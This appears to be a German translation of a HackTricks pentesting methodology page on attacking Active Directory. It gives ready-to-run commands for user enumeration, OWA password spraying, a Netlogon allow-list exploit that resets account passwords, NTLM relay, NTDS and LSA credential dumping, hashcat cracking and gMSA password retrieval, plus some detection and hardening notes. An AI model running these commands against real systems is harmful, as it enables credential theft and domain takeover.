# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Grundlegender Überblick

**Active Directory** dient als grundlegende Technologie und ermöglicht es **Netzwerkadministratoren**, **Domänen**, **Benutzer** und **Objekte** innerhalb eines Netzwerks effizient zu erstellen und zu verwalten. Es ist auf Skalierbarkeit ausgelegt und erleichtert die Organisation einer großen Anzahl von Benutzern in verwaltbare **Gruppen** und **Untergruppen**, während **Zugriffsrechte** auf verschiedenen Ebenen kontrolliert werden.

Die Struktur von **Active Directory** besteht aus drei primären Ebenen: **Domänen**, **Bäumen** und **Forests**. Eine **Domäne** umfasst eine Sammlung von Objekten wie **Benutzern** oder **Geräten**, die eine gemeinsame Datenbank verwenden. **Bäume** sind Gruppen dieser Domänen, die durch eine gemeinsame Struktur verbunden sind, und ein **Forest** stellt die Sammlung mehrerer Bäume dar, die durch **Trust Relationships** miteinander verbunden sind und die höchste Ebene der Organisationsstruktur bilden. Auf jeder dieser Ebenen können bestimmte **Zugriffs**- und **Kommunikationsrechte** festgelegt werden.

Zu den wichtigsten Konzepten innerhalb von **Active Directory** gehören:

1. **Directory** – Enthält alle Informationen zu Active Directory-Objekten.
2. **Object** – Bezeichnet Entitäten innerhalb des Directorys, darunter **Benutzer**, **Gruppen** oder **freigegebene Ordner**.
3. **Domain** – Dient als Container für Directory-Objekte. Innerhalb eines **Forests** können mehrere Domänen existieren, wobei jede ihre eigene Objektsammlung verwaltet.
4. **Tree** – Eine Gruppierung von Domänen, die eine gemeinsame Root-Domäne verwenden.
5. **Forest** – Die höchste Organisationsebene in Active Directory, bestehend aus mehreren Bäumen mit **Trust Relationships** zwischen ihnen.

**Active Directory Domain Services (AD DS)** umfassen eine Reihe von Diensten, die für die zentrale Verwaltung und Kommunikation innerhalb eines Netzwerks entscheidend sind. Zu diesen Diensten gehören:

1. **Domain Services** – Zentralisieren die Datenspeicherung und verwalten die Interaktionen zwischen **Benutzern** und **Domänen**, einschließlich **Authentifizierung** und **Suchfunktionen**.
2. **Certificate Services** – Überwachen die Erstellung, Verteilung und Verwaltung sicherer **digitaler Zertifikate**.
3. **Lightweight Directory Services** – Unterstützen Directory-fähige Anwendungen über das **LDAP-Protokoll**.
4. **Directory Federation Services** – Bieten **Single-Sign-on**-Funktionen, um Benutzer in einer einzigen Sitzung über mehrere Webanwendungen hinweg zu authentifizieren.
5. **Rights Management** – Unterstützt den Schutz urheberrechtlich geschützten Materials, indem die unbefugte Verbreitung und Nutzung reguliert wird.
6. **DNS Service** – Ist entscheidend für die Auflösung von **Domänennamen**.

Eine ausführlichere Erklärung findest du unter: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Um ein **AD anzugreifen**, musst du den **Kerberos-Authentifizierungsprozess** wirklich gut **verstehen**.\
[**Lies diese Seite, wenn du noch nicht weißt, wie er funktioniert.**](kerberos-authentication.md)

## Cheat Sheet

Unter [https://wadcoms.github.io/](https://wadcoms.github.io) findest du eine Übersicht der Befehle, die du zur Enumeration bzw. zum Exploit eines AD ausführen kannst.

> [!WARNING]
> Die Kerberos-Kommunikation **erfordert normalerweise einen Fully Qualified Domain Name (FQDN)**, damit der Client ein Ticket für den korrekten SPN erhalten kann. Beim Zugriff auf eine Maschine über ihre IP-Adresse wird häufig auf NTLM anstelle von Kerberos zurückgegriffen.

## Recon Active Directory (No creds/sessions)

Wenn du lediglich Zugriff auf eine AD-Umgebung hast, aber über keine Credentials/Sessions verfügst, könntest du:

- **Das Netzwerk pentesten:**
- Das Netzwerk scannen, Maschinen und offene Ports finden und versuchen, **Schwachstellen zu exploiten** oder **Credentials** daraus zu **extrahieren** (beispielsweise können [Drucker sehr interessante Ziele sein](ad-information-in-printers.md)).
- Eine DNS-Enumeration kann Informationen über wichtige Server in der Domäne liefern, etwa Webserver, Drucker, Shares, VPN, Medien usw.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Sieh dir die allgemeine [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) an, um weitere Informationen dazu zu erhalten.
- **Auf Null- und Guest-Zugriff auf SMB-Diensten prüfen** (dies funktioniert bei modernen Windows-Versionen nicht):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Eine ausführlichere Anleitung zur Enumeration eines SMB-Servers findest du hier:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP enumerieren**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Eine ausführlichere Anleitung zur LDAP-Enumeration findest du hier (achte **besonders auf den anonymen Zugriff**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Das Netzwerk vergiften**
- Credentials sammeln, indem du [**mit Responder Services imitierst**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Auf Hosts zugreifen, indem du [**den Relay-Angriff missbrauchst**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Credentials sammeln, indem du [**gefälschte UPnP-Dienste mit evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) **exponierst**
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Benutzernamen/Namen aus internen Dokumenten, sozialen Medien und Diensten (hauptsächlich dem Web) innerhalb der Domänenumgebungen sowie aus öffentlich verfügbaren Quellen extrahieren.
- Wenn du die vollständigen Namen von Mitarbeitern eines Unternehmens findest, kannst du verschiedene AD-**Benutzernamenskonventionen (**[**lies dies**](https://activedirectorypro.com/active-directory-user-naming-convention/)) ausprobieren. Die häufigsten Konventionen sind: _NameNachname_, _Name.Nachname_, _NamNach_ (jeweils 3 Buchstaben), _Nam.Nach_, _NNachname_, _N.Nachname_, _NachnameName_, _Nachname.Name_, _NachnameN_, _Nachname.N_, 3 _zufällige Buchstaben und 3 zufällige Zahlen_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Benutzer-Enumeration

- **Anonymous SMB/LDAP enum:** Sieh dir die Seiten zu [**Pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) und [**Pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) an.
- **Kerbrute enum**: Wenn ein **ungültiger Benutzername angefordert wird**, antwortet der Server mit dem **Kerberos-Fehlercode** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, wodurch wir feststellen können, dass der Benutzername ungültig war. **Gültige Benutzernamen** lösen entweder das **TGT in einer AS-REP**-Antwort oder den Fehler _KRB5KDC_ERR_PREAUTH_REQUIRED_ aus, der anzeigt, dass der Benutzer eine Pre-Authentication durchführen muss.
- **No Authentication gegen MS-NRPC**: Verwendung von auth-level = 1 (No authentication) gegen die MS-NRPC-(Netlogon-)Schnittstelle auf Domain Controllern. Die Methode ruft nach dem Binden an die MS-NRPC-Schnittstelle die Funktion `DsrGetDcNameEx2` auf, um ohne Credentials zu prüfen, ob der Benutzer oder Computer existiert. Das Tool [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementiert diese Art der Enumeration. Die Untersuchung ist [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> zu finden.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Wenn du einen dieser Server im Netzwerk gefunden hast, kannst du auch eine **User Enumeration gegen ihn** durchführen. Beispielsweise könntest du das Tool [**MailSniper**](https://github.com/dafthack/MailSniper) verwenden:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Listen von Benutzernamen findest du in [**diesem github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) und in diesem ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Du solltest jedoch die **Namen der Personen kennen, die im Unternehmen arbeiten**, und zwar aus dem Recon-Schritt, den du zuvor durchgeführt haben solltest. Mit Vor- und Nachnamen kannst du das Skript [**namemash.py**](https://gist.github.com/superkojiman/11076951) verwenden, um potenziell gültige Benutzernamen zu generieren.

### Missbrauch der Allow-List für einen verwundbaren Netlogon-Kanal (Onelogon)

Auch wenn **Zerologon** auf dem DC gepatcht wurde, können explizit zugelassene Accounts weiterhin dem **legacy/vulnerable Netlogon secure-channel behavior** ausgesetzt sein. Die riskante Konfiguration ist die GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** oder der entsprechende Registry-Wert **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Dieser Wert ist ein **SDDL security descriptor** (siehe [Security Descriptors](security-descriptors.md)). Jeder Account oder jede Gruppe, dem bzw. der der entsprechende ACE in der DACL gewährt wurde, kann angegriffen werden. Beispielsweise lässt `O:BAG:BAD:(A;;RC;;;WD)` effektiv **Everyone** zu.

Praktischer Ablauf für Operator:

1. **Ermittle die zugelassenen Principals**, indem du sowohl **SYSVOL/GPO** als auch die **live DC registry** überprüfst.
2. **Löse die in der SDDL gefundenen SIDs** zu echten AD-Benutzern und -Computern auf und priorisiere **DC machine accounts**, **trust accounts** und andere privilegierte Computer.
3. Versuche wiederholt eine **MS-NRPC / Netlogon authentication** als der zugelassene Account.
4. Nach einem erfolgreichen Treffer missbrauche das **Netlogon password-setting**, um das Passwort des Ziel-Accounts zurückzusetzen (der öffentliche PoC setzt es auf eine leere Zeichenfolge).<sup>[[9]](#references)[[10]](#references)</sup>

Schnelle Triage- bzw. Lab-Beispiele aus dem öffentlichen Artefakt:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
- Der **Scanner** ist nützlich, weil die effektive Allow-List in **SYSVOL**, in der **Registry** oder in beiden vorhanden sein kann.
- Der Exploit-Pfad selbst ist wichtig, weil er **keine Domain-Admin-Berechtigungen erfordert**, sobald ein verwundbares Konto identifiziert wurde.
- Die Kompromittierung eines **Domain-Controller-Computerkontos** wie `DC$` ist besonders gefährlich, weil das Zurücksetzen dieses Passworts direkt weiterführende **AD takeover**-Pfade ermöglichen kann.
- Die **Brute-Force-Durchführbarkeit** hängt vom Modus ab: Das öffentliche Artefakt beschreibt einen Meet-in-the-Middle-Ansatz, einen **24-Bit**-Brute-Force-Angriff, wenn ein weiteres Computerkonto verfügbar ist, sowie langsamere **32-Bit**-Varianten.

Hinweise zur Erkennung und Härtung:

- Überprüfe die Allow-List-Richtlinie und entferne alles außer vorübergehenden, ausdrücklich erforderlichen Kompatibilitätsausnahmen.
- Überwache die DC-**System**-Ereignisse **5827/5828/5829/5830/5831**, um verwundbare Netlogon-Verbindungen zu erkennen, die verweigert, entdeckt oder durch die Richtlinie ausdrücklich erlaubt wurden.
- Betrachte Konten in `VulnerableChannelAllowList` als **hohes Risiko**, bis die Legacy-Abhängigkeit entfernt wurde.

### Einen oder mehrere Benutzernamen kennen

Okay, du weißt also, dass du bereits einen gültigen Benutzernamen hast, aber keine Passwörter ... Dann versuche Folgendes:

- [**ASREPRoast**](asreproast.md): Wenn ein Benutzer **nicht über** das Attribut _DONT_REQ_PREAUTH_ verfügt, kannst du für diesen Benutzer eine **AS_REP-Nachricht anfordern**, die Daten enthält, die durch eine Ableitung des Passworts des Benutzers verschlüsselt wurden.
- [**Password Spraying**](password-spraying.md): Versuche die **häufigsten Passwörter** mit jedem der gefundenen Benutzer. Vielleicht verwendet ein Benutzer ein schwaches Passwort (beachte die Passwort-Richtlinie!).
- Beachte, dass du auch **OWA-Server sprühen** kannst, um Zugriff auf die Mailserver der Benutzer zu erhalten.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Möglicherweise kannst du einige Challenge-**Hashes erhalten**, indem du bestimmte Protokolle des **Netzwerks** mit **Poisoning** angreifst:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Die Active-Directory-Aufzählung liefert Benutzernamen, E-Mail-Kennungen und Benennungsmuster, potenzielle Hosts sowie Services, die dazu gebracht werden können, sich zu authentifizieren. Nutze diesen Kontext, um geeignete NTLM-[**Relay-Angriffe**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) und potenzielle Pfade in die AD-Umgebung zu identifizieren.

### Von NetExec-Workspaces gesteuerte Recon- und Relay-Posture-Prüfungen

- Verwende **`nxcdb`-Workspaces**, um den Status der AD-Recon pro Engagement getrennt zu verwalten: `workspace create <name>` erzeugt protokollspezifische SQLite-Datenbanken unter `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/usw.). Wechsle die Ansichten mit `proto smb|mssql|winrm` und liste gesammelte Secrets mit `creds` auf. Lösche sensible Daten nach Abschluss manuell: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Eine schnelle Subnetz-Erkennung mit **`netexec smb <cidr>`** zeigt **Domain**, **OS-Build**, **SMB-Signierungsanforderungen** und **Null Auth**. Mitglieder mit `(signing:False)` sind **Relay-anfällig**, während DCs häufig Signierung erfordern.
- Erzeuge **Hostnamen in /etc/hosts** direkt aus der NetExec-Ausgabe, um das Targeting zu erleichtern:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wenn **SMB relay to the DC is blocked** durch signing, prüfe weiterhin die **LDAP**-Sicherheitskonfiguration: `netexec ldap <dc>` hebt `(signing:None)` / schwaches channel binding hervor. Ein DC mit erzwungenem SMB signing, aber deaktiviertem LDAP signing, bleibt ein geeignetes **relay-to-LDAP**-Ziel für Angriffe wie **SPN-less RBCD**.

### Client-seitige Drucker-Credential-Leaks → umfangreiche Domain-Credential-Validierung

- Drucker-/Web-UIs **betten manchmal maskierte Admin-Passwörter in HTML ein**. Das Anzeigen des Quelltexts/der Devtools kann Klartext offenlegen (z. B. `<input value="<password>">`) und so Basic-auth-Zugriff auf Scan-/Druck-Repositories ermöglichen.
- Abgerufene Druckaufträge können **Onboarding-Dokumente im Klartext** mit benutzerspezifischen Passwörtern enthalten. Halte die Zuordnungen beim Testen korrekt zusammen:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Wenn du mit dem **null oder guest user** auf **andere PCs oder Shares zugreifen** kannst, könntest du **Dateien platzieren** (z. B. eine SCF-Datei), die bei einem Zugriff irgendwie eine **NTLM-Authentifizierung gegen dich auslösen**, sodass du die **NTLM-Challenge stehlen** und cracken kannst:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** behandelt jeden NT-Hash, den du bereits besitzt, als Kandidatenpasswort für andere, langsamere Formate, deren Schlüsselmaterial direkt aus dem NT-Hash abgeleitet wird. Anstatt lange Passphrasen in Kerberos-RC4-Tickets, NetNTLM-Challenges oder cached credentials per Brute-Force zu testen, übergibst du die NT-Hashes an Hashcats NT-candidate-Modi und lässt die Wiederverwendung von Passwörtern validieren, ohne jemals den Klartext zu erfahren. Dies ist besonders effektiv nach einem Domain-Kompromittieren, wenn du Tausende aktuelle und historische NT-Hashes sammeln kannst.<sup>[[5]](#references)</sup>

Verwende shucking, wenn:

- Du ein NT-Corpus aus DCSync-, SAM/SECURITY-Dumps oder credential vaults besitzt und die Wiederverwendung in anderen Domains/Forests testen musst.
- Du RC4-basiertes Kerberos-Material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM-Antworten oder DCC/DCC2-Blobs erfasst.
- Du die Wiederverwendung langer, nicht crackbarer Passphrasen schnell nachweisen und sofort per Pass-the-Hash pivotieren möchtest.

Die Technik funktioniert **nicht** gegen Verschlüsselungstypen, deren Schlüssel nicht dem NT-Hash entsprechen (z. B. Kerberos etype 17/18 AES). Wenn eine Domain ausschließlich AES erzwingt, musst du auf die regulären Passwortmodi zurückgreifen.

#### Aufbau eines NT-Hash-Corpus

- **DCSync/NTDS** – Verwende `secretsdump.py` mit history, um die größtmögliche Menge an NT-Hashes (einschließlich ihrer vorherigen Werte) zu sammeln:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History-Einträge erweitern den Kandidatenpool erheblich, da Microsoft bis zu 24 vorherige Hashes pro Account speichern kann. Weitere Möglichkeiten zum Sammeln von NTDS-Secrets findest du hier:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (oder Mimikatz `lsadump::sam /patch`) extrahiert lokale SAM/SECURITY-Daten und cached domain logons (DCC/DCC2). Entferne Duplikate und füge diese Hashes derselben `nt_candidates.txt`-Liste hinzu.
- **Metadaten verfolgen** – Speichere den Benutzernamen/die Domain, aus denen jeder Hash stammt (auch wenn die Wordlist nur Hex-Werte enthält). Übereinstimmende Hashes zeigen dir sofort, welcher Principal ein Passwort wiederverwendet, sobald Hashcat den erfolgreichen Kandidaten ausgibt.
- Bevorzuge Kandidaten aus demselben Forest oder einem vertrauten Forest; dadurch maximierst du die Wahrscheinlichkeit einer Überschneidung beim shucking.

#### Hashcat NT-candidate-Modi

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Hinweise:

- NT-candidate-Eingaben **müssen rohe NT-Hashes mit 32 Hex-Zeichen bleiben**. Deaktiviere Rule Engines (kein `-r`, keine Hybrid-Modi), da Manipulationen das Kandidatenschlüsselmaterial beschädigen.
- Diese Modi sind nicht grundsätzlich schneller, aber der NTLM-Keyspace (~30.000 MH/s auf einem M3 Max) ist etwa 100-mal schneller als Kerberos RC4 (~300 MH/s). Das Testen einer kuratierten NT-Liste ist wesentlich günstiger, als den gesamten Passwortbereich im langsamen Format zu durchsuchen.
- Verwende immer den **neuesten Hashcat-Build** (`git clone https://github.com/hashcat/hashcat && make install`), da die Modi 31500/31600/35300 erst kürzlich veröffentlicht wurden.<sup>[[7]](#references)</sup>
- Derzeit gibt es keinen NT-Modus für AS-REQ Pre-Auth, und AES-Etypes (19600/19700) benötigen das Klartextpasswort, da ihre Schlüssel über PBKDF2 aus UTF-16LE-Passwörtern und nicht aus rohen NT-Hashes abgeleitet werden.

#### Beispiel – Kerberoast RC4 (Modus 35300)

1. Erfasse mit einem Benutzer mit niedrigen Berechtigungen ein RC4-TGS für einen Ziel-SPN (Details findest du auf der Kerberoast-Seite):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Führe Shucking des Tickets mit deiner NT-Liste durch:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat leitet den RC4-Schlüssel aus jedem NT-Kandidaten ab und validiert den `$krb5tgs$23$...`-Blob. Eine Übereinstimmung bestätigt, dass der Service Account einen deiner vorhandenen NT-Hashes verwendet.

3. Pivotiere sofort per PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Optional kannst du den Klartext später mit `hashcat -m 1000 <matched_hash> wordlists/` wiederherstellen, falls erforderlich.

#### Beispiel – Cached credentials (Modus 31600)

1. Dump die cached logons von einer kompromittierten Workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopiere die DCC2-Zeile des interessanten Domain-Benutzers nach `dcc2_highpriv.txt` und führe Shucking durch:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Eine erfolgreiche Übereinstimmung liefert den NT-Hash, der bereits in deiner Liste bekannt ist, und beweist, dass der cached user ein Passwort wiederverwendet. Verwende ihn direkt für PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) oder brute-force ihn im schnellen NTLM-Modus, um den String wiederherzustellen.

Genau derselbe Workflow gilt für NetNTLM-Challenge-Responses (`-m 27000/27100`) und DCC (`-m 31500`). Sobald eine Übereinstimmung festgestellt wurde, kannst du Relay, SMB/WMI/WinRM PtH starten oder den NT-Hash offline mit Masks/Rules erneut cracken.



## Active Directory MIT Credentials/Session enumerieren

Für diese Phase musst du die **Credentials oder eine Session eines gültigen Domain-Accounts kompromittiert haben**. Wenn du über gültige Credentials oder eine Shell als Domain-Benutzer verfügst, **solltest du bedenken, dass die zuvor genannten Optionen weiterhin Möglichkeiten zur Kompromittierung anderer Benutzer darstellen**.

Bevor du mit der authentifizierten Enumeration beginnst, solltest du das **Kerberos-double-hop-Problem** verstehen.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Die Kompromittierung eines Accounts ist ein **wichtiger Schritt bei der Bewertung der Domain**, da sie eine authentifizierte **Active Directory Enumeration** ermöglicht:

In Bezug auf [**ASREPRoast**](asreproast.md) kannst du nun jeden potenziell verwundbaren Benutzer finden. Mit [**Password Spraying**](password-spraying.md) kannst du eine **Liste aller Benutzernamen** erhalten und das Passwort des kompromittierten Accounts, leere Passwörter sowie neue vielversprechende Passwörter testen.

- Du könntest [**CMD für grundlegende Recon**](../basic-cmd-for-pentesters.md#domain-info) verwenden.
- Du kannst auch [**powershell für Recon**](../basic-powershell-for-pentesters/index.html) verwenden, was unauffälliger sein wird.
- Du kannst außerdem [**powerview verwenden**](../basic-powershell-for-pentesters/powerview.md), um detailliertere Informationen zu extrahieren.
- Ein weiteres hervorragendes Tool für Recon in einem Active Directory ist [**BloodHound**](bloodhound.md). Es ist **nicht besonders unauffällig** (abhängig von den verwendeten Collection-Methoden), aber **wenn dir das egal ist**, solltest du es unbedingt ausprobieren. Finde heraus, wo Benutzer RDP verwenden können, finde Pfade zu anderen Gruppen usw.
- **Weitere automatisierte AD-Enumeration-Tools sind:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records des AD**](ad-dns-records.md), da sie interessante Informationen enthalten können.
- Ein **Tool mit GUI**, das du zur Enumeration des Verzeichnisses verwenden kannst, ist **AdExplorer.exe** aus der **SysInternal** Suite.
- Du kannst auch mit **ldapsearch** in der LDAP-Datenbank nach Credentials in den Feldern _userPassword_ und _unixUserPassword_ oder sogar nach _Description_ suchen. Siehe [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) für weitere Methoden.
- Wenn du **Linux** verwendest, kannst du die Domain außerdem mit [**pywerview**](https://github.com/the-useless-one/pywerview) enumerieren.
- Du könntest auch automatisierte Tools wie diese ausprobieren:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Alle Domain-Benutzer extrahieren**

Es ist sehr einfach, alle Domain-Benutzernamen unter Windows zu erhalten (`net user /domain`, `Get-DomainUser` oder `wmic useraccount get name,sid`). Unter Linux kannst du Folgendes verwenden: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` oder `enum4linux -a -u "user" -p "password" <DC IP>`

> Auch wenn dieser Enumeration-Abschnitt klein wirkt, ist er der wichtigste Teil überhaupt. Öffne die Links (insbesondere die zu cmd, powershell, powerview und BloodHound), lerne, wie man eine Domain enumeriert, und übe, bis du dich sicher fühlst. Während eines Assessments ist dies der entscheidende Moment, um den Weg zu DA zu finden oder festzustellen, dass nichts getan werden kann.

### Vorab erstellte Computer-Accounts mit vorhersehbaren Passwörtern -> gMSA password access

Für Legacy-Joins vorbereitete Computer-Accounts können ein vorhersehbares initiales Passwort behalten. Das `pre2k`-Modul von NetExec identifiziert den charakteristischen `userAccountControl`-Wert `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) und versucht ein Kerberos-TGT mit den ersten 14 Zeichen des kleingeschriebenen Computernamens – ohne das abschließende `$`. Betrachte diesen UAC-Wert als Kandidatenauswahl, anstatt allein aufgrund der Mitgliedschaft in **Pre-Windows 2000 Compatible Access** anzunehmen, dass das Passwort schwach ist.<sup>[[18]](#references)[[20]](#references)</sup>

Verwende eine authentifizierte LDAP-Enumeration, um die Kandidaten zu testen und erfolgreiche TGTs zu speichern. `ALL=True` erweitert die Tests über Objekte mit dem Standardfilter `4128` hinaus.<sup>[[18]](#references)</sup>
```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```
Ein fehlgeschlagener standardmäßiger/NTLM-Bind **entkräftet diesen Befund nicht**: Teste mit `-k`, einem FQDN, der zur DC aufgelöst wird, und einer mit dem KDC synchronisierten Uhr. Erfolgreiche Modul-Läufe schreiben Kandidatenlisten und erworbene Caches unter `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Nach der Kompromittierung des Computerprinzipals sollten dessen verschachtelte Gruppenmitgliedschaften und ausgehenden Berechtigungen grafisch erfasst werden. Insbesondere können in einem Sicherheitsdeskriptor `msDS-GroupMSAMembership` einer gMSA genannte Prinzipale `msDS-ManagedPassword` lesen; die Ausgabe von NetExecs `--gmsa` zeigt die berechtigten Prinzipale und gibt den aktuellen NT-Hash zurück, wenn der sich authentifizierende Computer dazu berechtigt ist.<sup>[[19]](#references)[[20]](#references)</sup>
```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```
Dann bewerten Sie die wiederhergestellte gMSA wie jedes andere Credential: Untersuchen Sie die Mitgliedschaft in lokalen/Domänen-Gruppen, Anmelderechte, SPNs, Delegation und erreichbare Services, bevor Sie Pass-the-Hash versuchen. Dieser ACL-basierte Abrufpfad unterscheidet sich von [Golden gMSA/dMSA](golden-dmsa-gmsa.md), bei dem verwaltete Passwörter nach einer Kompromittierung des KDS-Root-Keys abgeleitet werden.<sup>[[20]](#references)</sup>

### Kerberoast

Kerberoasting umfasst das Abrufen von **TGS tickets**, die von an Benutzerkonten gebundenen Services verwendet werden, und das Knacken ihrer Verschlüsselung, die auf Benutzerpasswörtern basiert, **offline**.

Mehr dazu:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote-Verbindung (RDP, SSH, FTP, Win-RM usw.)

Sobald Sie einige Credentials erhalten haben, können Sie prüfen, ob Sie Zugriff auf eine **machine** haben. Dazu können Sie **CrackMapExec** verwenden, um entsprechend Ihren Port-Scans mit verschiedenen Protokollen Verbindungen zu mehreren Servern herzustellen.

